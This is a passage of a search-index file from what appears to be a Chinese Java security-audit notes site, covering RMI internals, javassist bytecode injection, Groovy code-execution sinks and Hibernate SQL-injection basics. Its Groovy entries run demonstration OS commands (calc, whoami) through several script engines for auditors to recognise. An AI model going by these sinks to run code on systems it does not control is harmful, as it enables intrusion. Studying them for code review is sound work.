\u968f\u540e\u5ba2\u6237\u7aef\u60f3\u8981\u8fdc\u7a0b\u8c03\u7528hello\u8fd9\u4e2a\u5bf9\u8c61\u7684\u65b9\u6cd5\u65f6\uff0c\u5c31\u9700 IHello hello = (IHello) Naming.lookup(\"rmi://localhost:1099/hello\"); //\u6b64\u523b\u5ba2\u6237\u7aef\u67e5\u627e\u51fa\u4e86hello\u5bf9\u8c61\u7684stub\u6240\u5728url,\u670d\u52a1\u7aef\u8fd4\u56dehello\u5bf9\u8c61\u7684Stub //\u6b64\u65f6\u7684\u6570\u636e\u7c7b\u578b\u4f3c\u4e4e\u5fc5\u987b\u662f\u63a5\u53e3\u7c7b","title":"\u4e24\u53f0JVM\u901a\u8baf\u7684\u7b2c\u4e00\u6b65:RMI Registry"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#stubskeleton","text":"\u7531\u4e0a\u6587\u53ef\u77e5\u5f53\u5ba2\u6237\u673a\u8fdc\u7a0b\u8c03\u7528\u4e00\u4e2a\u5bf9\u8c61\u65f6,\u8fd4\u56de\u7684\u5176\u5b9e\u4e0d\u662f\u5bf9\u8c61\u672c\u8eab,\u800c\u662fstub. \u4f60\u53ef\u4ee5\u7406\u89e3stub\u4e3a\u4e00\u4e2a\u4e2d\u7ee7\u7ad9\uff0c\u5f53\u5ba2\u6237\u673a\u8c03\u7528\u8be5\u5bf9\u8c61\u67d0\u4e2a\u65b9\u6cd5\u65f6,\u5b9e\u9645\u4e0a\u662f\u901a\u8fc7stub\u4ee5socket\u7684\u65b9\u5f0f\u5411\u670d\u52a1\u5668\u7aef\u7684skeleton\u53d1\u9001\u5e8f\u5217\u5316\u5904\u7406\u7684\u65b9\u6cd5\u540d\u548c\u53c2\u6570\uff08skeleton\u53ef\u4ee5\u7406\u89e3\u4e3a\u670d\u52a1\u5668\u7aef\u4e0a\u7684\u771f\u5b9e\u5bf9\u8c61) \u670d\u52a1\u7aef\u7684skeletion\u53cd\u5e8f\u5217\u5316\u5f97\u5230\u7684\u65b9\u6cd5\u540d\u548c\u53c2\u6570\u5e76\u5904\u7406\u540e\u518d\u4ee5socket\u7684\u65b9\u5f0f\u628a\u8be5\u65b9\u6cd5\u751f\u6210\u7684\u7ed3\u679c\u4f20\u56destub,stub\u518d\u628a\u6570\u636e\u8fd4\u56de\u7ed9\u5ba2\u6237\u673a","title":"Stub\u548cSkeleton"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#_14","text":"\u670d\u52a1\u5668\u7aef import java.rmi.Remote; import java.rmi.registry.*; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; interface Hello extends Remote{ public String sayHello(String name) throws RemoteException; } class HelloImpl extends UnicastRemoteObject implements Hello{ protected HelloImpl()throws RemoteException { super(); } public String sayHello(String name) throws RemoteException{ return \"Hello\"+name; } } ------------------------------------------------------------------ public class Server{ public static void main(String[] args){ try{//\u5fc5\u987b\u6709try..catch Hello hello = new HelloImpl(); //\u4f3c\u4e4e\u6570\u636e\u7c7b\u578b\u53ea\u80fd\u662f\u63a5\u53e3\u7c7b LocateRegistry.createRegistry(1080); //\u5c06RMI registry\u7684\u7aef\u53e3\u8bbe\u7f6e\u4e3a1080 java.rmi.Naming.rebind(\"rmi://localhost:1080/hello\", hello);// \u5c06hello\u8fd9\u4e2a\u65b9\u6cd5\u5bf9\u8c61\u7ed1\u5b9a\u5728\u6307\u5b9aurl\u4e0a,rmi\u534f\u8bae System.out.print(\"OK\"); }catch(Exception e){ e.printStackTrace(); } } } \u5ba2\u6237\u673a\u7aef import java.rmi.Remote; import java.rmi.registry.*; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; import java.rmi.Naming; public class Client{ public static void main(String[] args){ try{//\u5fc5\u987b\u6709try..catch Hello hello_client = (Hello) Naming.lookup(\"rmi://localhost:1080/hello\"); //\u670d\u52a1\u5668\u7aef\u7ed1\u5b9a\u5728\u8be5url\u7684\u5bf9\u8c61\u6570\u636e\u7c7b\u578b\u662fHello\uff0c\u6240\u4ee5\u8fd9\u91cc\u7684\u6570\u636e\u7c7b\u578b\u4e5f\u662fHello System.out.print(hello_client.sayHello(\"fuck\")); }catch(Exception e){ e.printStackTrace(); } } } \u7ed3\u679c","title":"\u4ee3\u7801\u5b9e\u73b0\u8fdc\u7a0b\u8c03\u7528"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#javassist","text":"javassist \u662f\u4e00\u4e2a\u7c7b\u5e93\uff0c\u7528\u4e8e\u64cd\u4f5cjava\u5b57\u8282\u7801\u3002 \u6bd4\u5982\u6211\u4eec\u63a5\u4e0b\u6765\u5c31\u4f1a\u4f7f\u7528javassist\u6765\u52a8\u6001\u64cd\u4f5c\u5b57\u8282\u7801\u3002 test2.java public class test2 { public void gogo(){ System.out.println(\"yuansheng\"); } } test1.java import javassist.*; public class test1 { public static void main(String[] args) throws Exception{ ClassPool pool = ClassPool.getDefault(); CtClass class1 = pool.get(test2.class.getName()); String cmd = \"System.out.print(\\\"hello\\\");\"; class1.makeClassInitializer().insertBefore(cmd); \\\\\u63d2\u5165static\u9759\u6001\u4ee3\u7801\u5757\uff0c\u5185\u5bb9\u4e3acmd\u4e2d\u5185\u5bb9 class1.setName(\"class1\"); \\\\\u4e3a\u65b0\u7c7b\u547d\u540d\u4e3aclass1 class1.writeFile(\"d:\\\\test\"); \\\\\u5c06\u7c7b\u5199\u5165d:\\\\test\u6587\u4ef6\u5939 } } \u53cd\u7f16\u8bd1d:\\\\test\\\\class1.class // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // public class class1 { public class1() { } public void gogo() { System.out.println(\"yuansheng\"); } static { System.out.print(\"hello\"); } } \u53d1\u73b0\u6211\u4eec\u5df2\u7ecf\u5f80test2.java\u7684\u5185\u5bb9\u4e2d\u63d2\u5165\u4e86\u8f93\u51fahello\u7684\u9759\u6001\u4ee3\u7801\u5757\uff0c\u5e76\u4ee5class1.class\u5199\u5165d:\\\\test\u6587\u4ef6\u5939\u3002 javassist\u7684\u529f\u80fd\u9664\u6b64\u4e4b\u5916\u8fd8\u6709\u5f88\u591a","title":"javassist"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/","text":"\u5ba1\u8ba1\u6280\u5de7 \u6709\u673a\u53ef\u4e58\u7684\u7ec4\u4ef6 \u73af\u5883\u51c6\u5907\u4e0e\u601d\u8def bypass\u7ed5\u8fc7","title":"\u5ba1\u8ba1\u6280\u5de7"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/#_1","text":"\u6709\u673a\u53ef\u4e58\u7684\u7ec4\u4ef6 \u73af\u5883\u51c6\u5907\u4e0e\u601d\u8def bypass\u7ed5\u8fc7","title":"\u5ba1\u8ba1\u6280\u5de7"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/bypass%E7%BB%95%E8%BF%87/bypass%E7%BB%95%E8%BF%87/","text":"bypass\u7ed5\u8fc7","title":"bypass\u7ed5\u8fc7"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/bypass%E7%BB%95%E8%BF%87/bypass%E7%BB%95%E8%BF%87/#bypass","text":"","title":"bypass\u7ed5\u8fc7"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/","text":"\u6709\u673a\u53ef\u4e58\u7684\u7ec4\u4ef6 \u8868\u8fbe\u5f0f\u6ce8\u5165 Groovy-\u4ee3\u7801\u8c03\u7528 xstream \u53cd\u5e8f\u5217\u5316 Log4j2 RCE \u6d45\u6790FastJSON\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e Mybatis jackson\u53cd\u5e8f\u5217\u5316 Hibernate springboot Snakeyml\u53cd\u5e8f\u5217\u5316","title":"\u6709\u673a\u53ef\u4e58\u7684\u7ec4\u4ef6"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/#_1","text":"\u8868\u8fbe\u5f0f\u6ce8\u5165 Groovy-\u4ee3\u7801\u8c03\u7528 xstream \u53cd\u5e8f\u5217\u5316 Log4j2 RCE \u6d45\u6790FastJSON\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e Mybatis jackson\u53cd\u5e8f\u5217\u5316 Hibernate springboot Snakeyml\u53cd\u5e8f\u5217\u5316","title":"\u6709\u673a\u53ef\u4e58\u7684\u7ec4\u4ef6"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/","text":"Groovy-\u4ee3\u7801\u8c03\u7528 \u76ee\u5f55 \u7b80\u4ecb \u6f0f\u6d1e\u539f\u7406 GroovyShell GroovyScriptEngine GroovyClassLoader ScriptEngine \u5173\u952e\u5b57 \u7b80\u4ecb \u57fa\u4e8ejvm\u7684\u4e00\u4e2a\u8bed\u8a00\uff0c\u53ef\u88abjava\u4ee3\u7801\u8c03\u7528\u3002 \u6f0f\u6d1e\u539f\u7406 groovy\u4f5c\u4e3a\u4e00\u4e2a\u8bed\u8a00\uff0c\u53ef\u4ee5\u5f88\u8f7b\u677e\u7684\u8fdb\u884c\u547d\u4ee4\u6267\u884c class test { static void main(args){ def cmd = \"calc\"; println \"${cmd.execute()}\"; } } \u6240\u4ee5\u5728\u4ee3\u7801\u5ba1\u8ba1\u8fc7\u7a0b\u4e2d\uff0c\u5b58\u5728groovy\u4ee3\u7801\u53ef\u63a7\u6216\u8005\u53ef\u4ee5\u4e0a\u4f20\u6076\u610fgroovy\u811a\u672c\u7684\u60c5\u51b5\uff0c\u5c31\u5f88\u6709\u53ef\u80fd\u5bfc\u81f4rce\u3002 GroovyShell \u89e3\u6790groovy\u8868\u8fbe\u5f0f import groovy.lang.GroovyShell; public class GroovyShellExample { public static void main( String[] args ) { GroovyShell groovyShell = new GroovyShell(); groovyShell.evaluate(\"\\\"calc\\\".execute()\"); } } \u6216\u8005\u8fd0\u884c\u6076\u610fgroovy\u811a\u672c public class GroovyShellExample { public static void main( String[] args ) throws Exception { GroovyShell groovyShell = new GroovyShell(); #test.groovy: println \"whoami\".execute().text Script script = groovyShell.parse(new File(\"src/test.groovy\")); script.run(); } } GroovyScriptEngine \u4ece\u6587\u4ef6\u7cfb\u7edf\u3001URL\u3001\u6570\u636e\u5e93\u7b49\u7b49\u52a0\u8f7dgroovy\u811a\u672c\u3002\u611f\u89c9\u548cGroovyShell\u52a0\u8f7dgroovy\u811a\u672c\u5dee\u4e0d\u591a\u3002 import groovy.lang.Binding; import groovy.util.GroovyScriptEngine; public class GroovyScriptEngineExample { public static void main(String[] args) throws Exception { GroovyScriptEngine groovyScriptEngine = new GroovyScriptEngine(\"\"); groovyScriptEngine.run(\"src/test.groovy\",new Binding()); } } GroovyClassLoader GroovyClassLoader\u662f\u4e00\u4e2a\u5b9a\u5236\u7684\u7c7b\u88c5\u8f7d\u5668\uff0c\u8d1f\u8d23\u89e3\u91ca\u52a0\u8f7dJava\u7c7b\u4e2d\u7528\u5230\u7684Groovy\u7c7b\u3002 //\u4ece\u6587\u672c\u4e2d\u83b7\u53d6Groovy\u7c7b GroovyClassLoader groovyClassLoader = new GroovyClassLoader(); Class aClass = groovyClassLoader.parseClass(\"class GroovyTest {n\" + \" static void main(args){n\" + \" println \"${'whoami'.execute().text}\"n\" + \"n\" + \" }n\" + \"}\"); GroovyObject groovyObject = (GroovyObject) aClass.newInstance(); groovyObject.invokeMethod(\"main\", \"\"); //\u4ece\u6587\u4ef6\u4e2d\u83b7\u53d6Groovy\u7c7b GroovyClassLoader groovyClassLoader = new GroovyClassLoader(); Class aClass = groovyClassLoader.parseClass(new File(\"src/main/java/ysoserial/vulndemo/GroovyTest.groovy\")); GroovyObject object = (GroovyObject) aClass.newInstance(); object.invokeMethod(\"main\", \"\"); ScriptEngine ScriptEngine\u662f\u4e00\u4e2a\u811a\u672c\u5f15\u64ce\u7ba1\u7406\u5668\uff0c\u5b83\u652f\u6301\u88c5\u8f7dgroovy\u5f15\u64ce\u6765\u6267\u884cgroovy\u4ee3\u7801\u3002 //\u6587\u672c import javax.script.ScriptEngine; import javax.script.ScriptEngineManager; public class ScriptEngineExample { public static void main( String[] args ) throws Exception { ScriptEngine groovyEngine = new ScriptEngineManager().getEngineByName(\"groovy\"); groovyEngine.eval(\"\\\"calc\\\".execute()\"); } } //\u811a\u672c import javax.script.ScriptEngine; import javax.script.ScriptEngineManager; import java.io.BufferedReader; import java.io.FileReader; public class ScriptEngineExample { public static void main( String[] args ) throws Exception { ScriptEngine groovyEngine = new ScriptEngineManager().getEngineByName(\"groovy\"); String code = readfile(\"src/test.groovy\"); groovyEngine.eval(code); } public static String readfile(String filename) throws Exception { BufferedReader in = new BufferedReader(new FileReader(filename)); String string = \"\"; String str; while ((str = in.readLine()) != null) { string = string + str; } return string; } } \u5173\u952e\u5b57 new GroovyShell() new GroovyScriptEngine new GroovyClassLoader getEngineByName(\"groovy\")","title":"Groovy-\u4ee3\u7801\u8c03\u7528"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/#groovy-","text":"","title":"Groovy-\u4ee3\u7801\u8c03\u7528"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/#_1","text":"\u7b80\u4ecb \u6f0f\u6d1e\u539f\u7406 GroovyShell GroovyScriptEngine GroovyClassLoader ScriptEngine \u5173\u952e\u5b57","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/#_2","text":"\u57fa\u4e8ejvm\u7684\u4e00\u4e2a\u8bed\u8a00\uff0c\u53ef\u88abjava\u4ee3\u7801\u8c03\u7528\u3002","title":"\u7b80\u4ecb"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/#_3","text":"groovy\u4f5c\u4e3a\u4e00\u4e2a\u8bed\u8a00\uff0c\u53ef\u4ee5\u5f88\u8f7b\u677e\u7684\u8fdb\u884c\u547d\u4ee4\u6267\u884c class test { static void main(args){ def cmd = \"calc\"; println \"${cmd.execute()}\"; } } \u6240\u4ee5\u5728\u4ee3\u7801\u5ba1\u8ba1\u8fc7\u7a0b\u4e2d\uff0c\u5b58\u5728groovy\u4ee3\u7801\u53ef\u63a7\u6216\u8005\u53ef\u4ee5\u4e0a\u4f20\u6076\u610fgroovy\u811a\u672c\u7684\u60c5\u51b5\uff0c\u5c31\u5f88\u6709\u53ef\u80fd\u5bfc\u81f4rce\u3002","title":"\u6f0f\u6d1e\u539f\u7406"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/#groovyshell","text":"\u89e3\u6790groovy\u8868\u8fbe\u5f0f import groovy.lang.GroovyShell; public class GroovyShellExample { public static void main( String[] args ) { GroovyShell groovyShell = new GroovyShell(); groovyShell.evaluate(\"\\\"calc\\\".execute()\"); } } \u6216\u8005\u8fd0\u884c\u6076\u610fgroovy\u811a\u672c public class GroovyShellExample { public static void main( String[] args ) throws Exception { GroovyShell groovyShell = new GroovyShell(); #test.groovy: println \"whoami\".execute().text Script script = groovyShell.parse(new File(\"src/test.groovy\")); script.run(); } }","title":"GroovyShell"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/#groovyscriptengine","text":"\u4ece\u6587\u4ef6\u7cfb\u7edf\u3001URL\u3001\u6570\u636e\u5e93\u7b49\u7b49\u52a0\u8f7dgroovy\u811a\u672c\u3002\u611f\u89c9\u548cGroovyShell\u52a0\u8f7dgroovy\u811a\u672c\u5dee\u4e0d\u591a\u3002 import groovy.lang.Binding; import groovy.util.GroovyScriptEngine; public class GroovyScriptEngineExample { public static void main(String[] args) throws Exception { GroovyScriptEngine groovyScriptEngine = new GroovyScriptEngine(\"\"); groovyScriptEngine.run(\"src/test.groovy\",new Binding()); } }","title":"GroovyScriptEngine"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/#groovyclassloader","text":"GroovyClassLoader\u662f\u4e00\u4e2a\u5b9a\u5236\u7684\u7c7b\u88c5\u8f7d\u5668\uff0c\u8d1f\u8d23\u89e3\u91ca\u52a0\u8f7dJava\u7c7b\u4e2d\u7528\u5230\u7684Groovy\u7c7b\u3002 //\u4ece\u6587\u672c\u4e2d\u83b7\u53d6Groovy\u7c7b GroovyClassLoader groovyClassLoader = new GroovyClassLoader(); Class aClass = groovyClassLoader.parseClass(\"class GroovyTest {n\" + \" static void main(args){n\" + \" println \"${'whoami'.execute().text}\"n\" + \"n\" + \" }n\" + \"}\"); GroovyObject groovyObject = (GroovyObject) aClass.newInstance(); groovyObject.invokeMethod(\"main\", \"\"); //\u4ece\u6587\u4ef6\u4e2d\u83b7\u53d6Groovy\u7c7b GroovyClassLoader groovyClassLoader = new GroovyClassLoader(); Class aClass = groovyClassLoader.parseClass(new File(\"src/main/java/ysoserial/vulndemo/GroovyTest.groovy\")); GroovyObject object = (GroovyObject) aClass.newInstance(); object.invokeMethod(\"main\", \"\");","title":"GroovyClassLoader"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/#scriptengine","text":"ScriptEngine\u662f\u4e00\u4e2a\u811a\u672c\u5f15\u64ce\u7ba1\u7406\u5668\uff0c\u5b83\u652f\u6301\u88c5\u8f7dgroovy\u5f15\u64ce\u6765\u6267\u884cgroovy\u4ee3\u7801\u3002 //\u6587\u672c import javax.script.ScriptEngine; import javax.script.ScriptEngineManager; public class ScriptEngineExample { public static void main( String[] args ) throws Exception { ScriptEngine groovyEngine = new ScriptEngineManager().getEngineByName(\"groovy\"); groovyEngine.eval(\"\\\"calc\\\".execute()\"); } } //\u811a\u672c import javax.script.ScriptEngine; import javax.script.ScriptEngineManager; import java.io.BufferedReader; import java.io.FileReader; public class ScriptEngineExample { public static void main( String[] args ) throws Exception { ScriptEngine groovyEngine = new ScriptEngineManager().getEngineByName(\"groovy\"); String code = readfile(\"src/test.groovy\"); groovyEngine.eval(code); } public static String readfile(String filename) throws Exception { BufferedReader in = new BufferedReader(new FileReader(filename)); String string = \"\"; String str; while ((str = in.readLine()) != null) { string = string + str; } return string; } }","title":"ScriptEngine"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/Groovy-%E4%BB%A3%E7%A0%81%E8%B0%83%E7%94%A8/#_4","text":"new GroovyShell() new GroovyScriptEngine new GroovyClassLoader getEngineByName(\"groovy\")","title":"\u5173\u952e\u5b57"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Hibernate/Hibernate/","text":"Hibernate \u76ee\u5f55 \u7b80\u4ecb \u914d\u7f6e\u6587\u4ef6 \u7528\u6cd5 \u6ce8\u5165 sql\u8bed\u53e5\u7b80\u5355\u62fc\u63a5\u5bfc\u81f4\u6ce8\u5165 HQL\u6ce8\u5165 \u5e38\u89c1\u4e1a\u52a1\u4ee3\u7801 Mysql postgresql oracle \u7b80\u4ecb \u548cMybatis\u4e00\u4e2a\u6027\u8d28\uff0c\u7528\u4e8e\u6570\u636e\u5e93\u64cd\u4f5c\u7684\u3002 \u914d\u7f6e\u6587\u4ef6 \u60f3\u8981\u8ba9\u4e00\u4e2a\u6570\u636e\u5e93\u64cd\u4f5c\uff08DAO\u5c42\uff09\u7684\u4ee3\u7801\u8dd1\u8d77\u6765\uff0c\u9700\u8981\u63d0\u524d\u914d\u7f6e\u4e24\u4e2a\u914d\u7f6e\u6587\u4ef6\uff1a \u4e00\u822c\u4e0eJavaBean\u5bf9\u8c61\u540c\u76ee\u5f55\u7684 *.hbm.xml\uff08\u7528\u4e8e\u5bf9\u8c61\u6620\u5c04\uff09\uff0c\u548c\u914d\u7f6e\u6570\u636e\u5e93\u8fde\u63a5\u4fe1\u606f\u7684hibernate.cfg.xml\u3002 \u4e0b\u9762\u662fhbm.xml\u7684\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5c06User\u7c7b\u7684\u51e0\u4e2a\u5c5e\u6027\u5bf9\u6620\u5230\u6570\u636e\u5e93\u4e2d\u7684\u5bf9\u5e94column <!--\u5728domain\u5305\u4e0b--> <hibernate-mapping package=\"zhongfucheng.domain\"> <!--\u7c7b\u540d\u4e3aUser\uff0c\u8868\u540d\u4e5f\u4e3aUser--> <class name=\"User\" table=\"user\"> <!--\u4e3b\u952e\u6620\u5c04\uff0c\u5c5e\u6027\u540d\u4e3aid\uff0c\u5217\u540d\u4e5f\u4e3aid--> <id name=\"id\" column=\"id\"> <!--\u6839\u636e\u5e95\u5c42\u6570\u636e\u5e93\u4e3b\u952e\u81ea\u52a8\u589e\u957f--> <generator class=\"native\"/> </id> <!--\u975e\u4e3b\u952e\u6620\u5c04\uff0c\u5c5e\u6027\u548c\u5217\u540d\u4e00\u4e00\u5bf9\u5e94--> <property name=\"username\" column=\"username\"/> <property name=\"cellphone\" column=\"cellphone\"/> <property name=\"password\" column=\"password\"/> </class> </hibernate-mapping> hibernate.cfg.xml\u7684\u4f8b\u5b50 <hibernate-configuration> <!-- \u901a\u5e38\uff0c\u4e00\u4e2asession-factory\u8282\u70b9\u4ee3\u8868\u4e00\u4e2a\u6570\u636e\u5e93 --> <session-factory> <!-- 1. \u6570\u636e\u5e93\u8fde\u63a5\u914d\u7f6e --> <property name=\"hibernate.connection.driver_class\">com.mysql.jdbc.Driver</property> <property name=\"hibernate.connection.url\">jdbc:mysql:///zhongfucheng</property> <property name=\"hibernate.connection.username\">root</property> <property name=\"hibernate.connection.password\">root</property> <!-- \u6570\u636e\u5e93\u65b9\u6cd5\u914d\u7f6e\uff0c hibernate\u5728\u8fd0\u884c\u7684\u65f6\u5019\uff0c\u4f1a\u6839\u636e\u4e0d\u540c\u7684\u65b9\u8a00\u751f\u6210\u7b26\u5408\u5f53\u524d\u6570\u636e\u5e93\u8bed\u6cd5\u7684sql --> <property name=\"hibernate.dialect\">org.hibernate.dialect.MySQL5Dialect</property> <!-- 2. \u5176\u4ed6\u76f8\u5173\u914d\u7f6e --> <!-- 2.1 \u663e\u793ahibernate\u5728\u8fd0\u884c\u65f6\u5019\u6267\u884c\u7684sql\u8bed\u53e5 --> <property name=\"hibernate.show_sql\">true</property> <!-- 2.2 \u683c\u5f0f\u5316sql --> <property name=\"hibernate.format_sql\">true</property> <!-- 2.3 \u81ea\u52a8\u5efa\u8868 --> <property name=\"hibernate.hbm2ddl.auto\">create</property> <!--3. \u52a0\u8f7d\u6240\u6709\u6620\u5c04--> <mapping resource=\"zhongfucheng/domain/User.hbm.xml\"/> </session-factory> </hibernate-configuration> \u7528\u6cd5 \u6ce8\u5165 \u6570\u636e\u5e93\u76f8\u5173\u7684\u6846\u67b6\u603b\u7ed5\u4e0d\u8fc7sql\u6ce8\u5165\u3002 Hibernate\u7684\u67e5\u8be2\u64cd\u4f5c\u652f\u6301SQL\uff08\u539f\u751fSQL\u8bed\u53e5\uff09\uff0cHQL\uff08\u53ea\u9700\u5199\u5c11\u91cfSQL\u8bed\u53e5\uff09\uff0cQBC\uff08\u4e0d\u7528\u8c22SQL\u8bed\u53e5\uff0c\u4f46\u7528\u7684\u4e0d\u591a\uff09\u548c\u4e3b\u952e\u67e5\u8be2\uff08\u901a\u8fc7\u8868\u7684\u4e3b\u952e\u6765\u5b9a\u4f4d\u6570\u636e\uff0c\u4e5f\u662f\u4e0d\u7528\u5199SQL\u8bed\u53e5\uff09 sql\u8bed\u53e5\u7b80\u5355\u62fc\u63a5\u5bfc\u81f4\u6ce8\u5165 \u6ca1\u5565\u597d\u8bf4\u7684 HQL\u6ce8\u5165 